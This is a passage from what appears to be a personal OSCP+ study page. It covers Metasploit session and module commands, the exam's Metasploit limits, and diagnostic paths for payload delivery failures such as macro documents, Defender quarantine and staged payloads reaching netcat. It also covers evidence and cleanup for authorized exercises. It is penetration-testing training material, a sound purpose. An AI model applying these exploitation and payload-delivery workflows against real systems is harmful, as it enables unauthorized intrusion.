+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">jobs -l
+sessions -l
+sessions -i SESSION_ID
+background
+sessions -k SESSION_ID
+jobs -k JOB_ID
+</code></pre>
+<p><code>ExitOnSession false</code> keeps the handler available after a session opens. <code>run -j</code> backgrounds the handler. A session ID is local to that framework instance; record the target, identity, payload and listener rather than relying on the number alone.</p>
+<p>Handler failure cues:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Output</th><th>Interpretation</th></tr></thead><tbody><tr><td>Handler never binds</td><td>Bad local address, occupied port or privilege issue</td></tr><tr><td>Raw listener receives connection; framework does not</td><td>Different port/interface or payload transport</td></tr><tr><td>Handler receives connection but no session</td><td>Exact payload/stager mismatch, stage blocked or crash</td></tr><tr><td>Session opens then dies</td><td>Parent exits, payload exit behavior, route/control or process crash</td></tr><tr><td>Session opens as unexpected architecture/type</td><td>Default payload or target was not explicitly selected</td></tr></tbody></table>
+<h2 id="10-metasploit-module-workflow-and-exam-boundary">10. Metasploit module workflow and exam boundary</h2>
+<p>Manual module inspection:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">search type:exploit cve:CVE_ID
+info MODULE_PATH
+use MODULE_PATH
+show options
+show advanced
+show targets
+show payloads
+set RHOSTS TARGET
+set RPORT PORT
+set TARGET TARGET_ID
+set PAYLOAD PAYLOAD_NAME
+set LHOST LHOST
+set LPORT LPORT
+show missing
+run
+</code></pre>
+<p>Interpretation rules:</p>
+<ul>
+<li>module rank describes expected exploit stability, not target vulnerability;</li>
+<li><code>check</code> is an active module operation and does not prove exploitability when unsupported or inconclusive;</li>
+<li>target IDs, default payloads and options vary by module/version;</li>
+<li>automatic target selection is still an assumption to verify;</li>
+<li>a module's success message is weaker than a verified session, host and identity;</li>
+<li><code>setg</code> persists values across modules and can silently aim later work at the wrong host; prefer local <code>set</code> unless global state is intentionally tracked.</li>
+</ul>
+<p>Current OSCP+ restriction:</p>
+<ul>
+<li><code>msfvenom</code> and <code>exploit/multi/handler</code> may be used against all targets, except that a Meterpreter payload remains subject to the one-target limit;</li>
+<li>any Metasploit Auxiliary, Exploit or Post module—or Meterpreter payload—locks the selection to one target, even if <code>check</code> or the attack fails;</li>
+<li>Metasploit pivoting is prohibited;</li>
+<li>automatic exploitation tools are prohibited.</li>
+</ul>
+<p>Use manual/source-reviewed exploitation as the reusable baseline. Decide on the restricted Metasploit target deliberately and record that decision before using a restricted module or Meterpreter.</p>
+<h2 id="11-worked-diagnostic-paths">11. Worked diagnostic paths</h2>
+<h3 id="a-document-delivered-no-callback">A. Document delivered, no callback</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">Observed: document exists
+Unknown: opened, macro permitted, child command, network route
+Test: MOTW/policy → harmless marker → child process/download → callback route
+Action: repair first failed gate; do not regenerate the payload first
+</code></pre>
+<h3 id="b-executable-disappears-after-transfer">B. Executable disappears after transfer</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">Observed: transfer response succeeded
+Test: destination listing/hash → Defender detection/resource/event
+Interpretation: transfer success is not retention; quarantine requires evidence
+Action: choose a justified alternate execution form or native route, within scope
+</code></pre>
+<h3 id="c-powershell-says-scripts-are-disabled">C. PowerShell says scripts are disabled</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">Observed: explicit execution-policy error
+Test: Get-ExecutionPolicy -List and GPO precedence
+Action: use a process-scoped invocation if allowed; do not call this an AMSI result
+</code></pre>
+<h3 id="d-connection-reaches-netcat-but-there-is-no-shell">D. Connection reaches Netcat but there is no shell</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">Observed: TCP connection
+Test: generated payload name
+Interpretation: staged payload may have reached a raw listener
+Action: use exact multi/handler or generate a compatible stageless command shell
+</code></pre>
+<h3 id="e-binary-exists-but-returns-not-found-on-linux">E. Binary exists but returns “not found” on Linux</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">Observed: path and file exist
+Test: file, readelf interpreter, ldd, shebang
+Interpretation: loader/interpreter dependency may be missing
+Action: build/choose a compatible artifact; do not change callback settings
+</code></pre>
+<h3 id="f-metasploit-module-reports-completion-no-session">F. Metasploit module reports completion, no session</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">Observed: module ran
+Test: exact target profile, payload, callback route, handler output and service state
+Interpretation: completion is not verified execution/session
+Action: preserve module output and diagnose the first missing state
+</code></pre>
+<h2 id="12-evidence-and-cleanup">12. Evidence and cleanup</h2>
+<p>Record:</p>
+<ul>
+<li>source and hash of the original artifact or exploit;</li>
+<li>exact changes and payload-generation command;</li>
+<li>delivery path and resulting hash;</li>
+<li>required user/trigger action;</li>
+<li>OS, process architecture, format and runtime assumptions;</li>
+<li>handler payload, bind and route;</li>
+<li>security-control errors/events used for diagnosis;</li>
+<li>verified host, identity and session type;</li>
+<li>listener/job/process/artifact cleanup.</li>
+</ul>
+<p>Remove temporary documents, shortcuts, WebDAV content, payloads, handler jobs and policy changes created for the authorized exercise. Do not claim AV evasion, user execution or a session without observed evidence.</p>
+<h2 id="tooling-for-this-section">Tooling for this section</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Tool</th><th>Purpose</th><th>Required context</th><th>Baseline</th><th>Decisive output</th><th>Failure cue</th></tr></thead><tbody><tr><td><code>file</code>/<code>readelf</code>/<code>ldd</code></td><td>Validate Linux format, architecture and runtime</td><td>Local artifact or target shell</td><td>Section 4.1</td><td>Matching format/interpreter/libraries</td><td>Existing file returns loader error</td></tr><tr><td>PowerShell built-ins</td><td>Inspect architecture, zone, policy and logs</td><td>Windows command execution; permissions vary</td><td>Sections 3–7</td><td>Specific policy/status/event</td><td>Missing cmdlet/log is inconclusive</td></tr><tr><td>WsgiDAV</td><td>Conditional WebDAV stage for Library-file exercise</td><td>Installed server, permitted bind and client route</td><td>Section 3.2</td><td>OPTIONS/GET and Explorer access</td><td>Empty library or no server request</td></tr><tr><td><code>msfvenom</code></td><td>Generate a selected payload representation</td><td>Known OS/arch/format/staging/route</td><td>Section 8</td><td>Expected metadata and artifact</td><td>Successful generation alone proves nothing on target</td></tr><tr><td><code>multi/handler</code></td><td>Receive exact framework/staged protocol</td><td>Matching payload and reachable listener</td><td>Section 9</td><td>Expected session opens</td><td>Connection without session implies mismatch/stage failure</td></tr><tr><td>Netcat/Ncat</td><td>Raw listener and simple socket proof</td><td>Compatible raw command shell or test connection</td><td>Related shell procedure</td><td>Expected peer and usable I/O</td><td>Cannot stage a framework payload</td></tr><tr><td><code>tcpdump</code>/packet capture</td><td>Localize connection boundary</td><td>Capture permission and correct interface</td><td><code>tcpdump -ni any tcp port LPORT</code></td><td>SYN/handshake/close sequence</td><td>No packet cannot by itself identify earlier failed layer</td></tr></tbody></table>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200, Chapter 12 pp. 343–374, selected Chapter 15 pp. 416–441, and Chapter 21 pp. 653–704.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">Current OSCP+ Body of Knowledge</a> and <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">exam guide</a></li>
+<li><a href="https://learn.microsoft.com/en-us/DeployOffice/security/internet-macros-blocked">Microsoft: macros from the Internet are blocked by default</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry">Microsoft Library Description schema</a></li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies">PowerShell execution policies</a> and <a href="https://learn.microsoft.com/en-us/powershell/scripting/security/security-features">security features</a></li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus">Microsoft Defender status</a>, <a href="https://learn.microsoft.com/en-us/powershell/module/defender/get-mpthreatdetection">threat history</a> and <a href="https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-mdav-scan-issues">event logs</a></li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy">Microsoft <code>Get-AppLockerPolicy</code></a></li>
+<li><a href="https://docs.rapid7.com/metasploit/working-with-payloads">Metasploit payloads</a>, <a href="https://docs.rapid7.com/metasploit/modules/">module workflow</a> and <a href="https://github.com/rapid7/metasploit-framework/blob/master/docs/metasploit-framework.wiki/How-to-use-msfvenom.md">msfvenom</a></li>
+<li><a href="https://github.com/mar10/wsgidav">WsgiDAV</a></li>
+<li><a href="https://lizajose.github.io/getSH/useful-stuff">getSH Useful Stuff and Tool Cheatsheet</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li><a href="https://github.com/LeonardoE95/OSCP">Hexdump OSCP repository</a>: live index includes Metasploit, Word macro, Windows Library-file and AMSI resources. The narrow mechanics above were checked against current official sources; the dedicated AMSI-bypass resource was not imported because deep bypass development is outside this speedrun.</li>
+</ul></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
